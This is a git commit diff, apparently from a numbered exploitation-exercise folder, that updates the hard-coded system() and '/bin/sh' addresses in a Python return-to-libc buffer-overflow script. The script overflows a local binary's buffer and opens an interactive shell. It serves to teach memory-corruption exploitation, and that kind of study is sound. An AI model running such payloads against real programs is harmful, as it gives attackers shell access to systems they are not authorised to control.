aca64025e49a6f684358b5479bc6ff9da10842fc
Andrey Konovalov <adech.fo@gmail.com>
2015-05-07 21:26:08 +0300

    Add bypass64

--- 13-reverse6/rop/02-return-to-libc.py
+++ 13-reverse6/rop/02-return-to-libc.py
@@ -6,9 +6,9 @@ from zio import *
 
 payload = 'a' * 128  # buffer
 payload += 'b' * 12  # garbage and old ebp
-payload += struct.pack('<I', 0xf7e42190) # system address
+payload += struct.pack('<I', 0xf7e46190) # system address
 payload += 'c' * 4                       # fake return address for system
-payload += struct.pack('<I', 0xf7f62a24) # "/bin/sh" address
+payload += struct.pack('<I', 0xf7f66a24) # "/bin/sh" address
 
 io = zio("./02-return-to-libc" + " " + payload)
 io.interact()
